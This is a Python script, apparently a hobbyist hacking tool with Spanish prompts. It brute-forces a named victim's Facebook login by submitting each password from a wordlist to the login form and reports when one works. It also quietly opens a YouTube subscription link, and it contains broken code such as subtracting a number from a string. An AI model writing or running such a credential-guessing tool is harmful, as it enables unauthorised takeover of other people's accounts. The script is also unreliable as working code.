import sys
import os
import random
import mechanize
import cookielib

os.system ("clear")

print(("""
\033[1;33;40m
 _____      _     __        __
|_   _|   _| |_ __\ \      / /_ _ _ __ ___ ____
  | || | | | __/ _ \ \ /\ / / _` | '__/ _ \_  /
  | || |_| | || (_) \ V  V / (_| | | |  __// /
  |_| \__,_|\__\___/ \_/\_/ \__,_|_|  \___/___|
"""))
print(("""
\033[1;36;40m
    _____              _                 _
   |  ___|_ _  ___ ___| |__   ___   ___ | | __     
   | |_ / _` |/ __/ _ \ '_ \ / _ \ / _ \| |/ /
   |  _| (_| | (_|  __/ |_) | (_) | (_) |   <
   |_|  \__,_|\___\___|_.__/ \___/ \___/|_|\_\
                  Fuerza Bruta

""").encode('utf-8'))


useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
 
email = str(raw_input("telefono o correo de la victima : "))
pwd_file = str(raw_input("wordlist : "))

os.system ("termux-open https://www.youtube.com/channel/UCaigfZGIirT4jb-g9igyzKg?sub_confirmation=1")
try:
    list = open(pwd_file,'r')
    passwords = list.readlines()
except IOError:
    print(("""
\033[1;33;40m

       El archivo que intentas introducir
         No existe o lo escribiste mal
            Intenta con los archivos

1.txt       2.txt      3.txt     4.txt    5.txt

""").encode('utf-8'))
    sys.exit(0)
 
def start(password):
    try:
        br.addheaders = [('User-agent', random.choice(useragents))]
        br.open('https://www.facebook.com/login.php?login_attempt=1')
        br.select_form(nr=0)
 
        br.form['email'] = email
        br.form['pass'] = password
        br.submit()
        log = br.geturl()
        print("No:\t" + str(password)-87)
        if log == 'https://www.facebook.com/':    
            print ("\Exelente :\t " + password)
            sys.exit(0)
        else:
            return
    except KeyboardInterrupt:
        sys.exit(1)
 
br = mechanize.Browser()
cj = cookielib.LWPCookieJar()
br.set_handle_robots(False)
br.set_handle_equiv(True)
br.set_handle_referer(True)
br.set_handle_redirect(True)
br.set_cookiejar(cj)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
 
for i in range(len(passwords)):
    passwords[i] = passwords[i].strip()
    passwords[i] = passwords[i].replace('\n','')
 
for password in passwords:
    start(password)
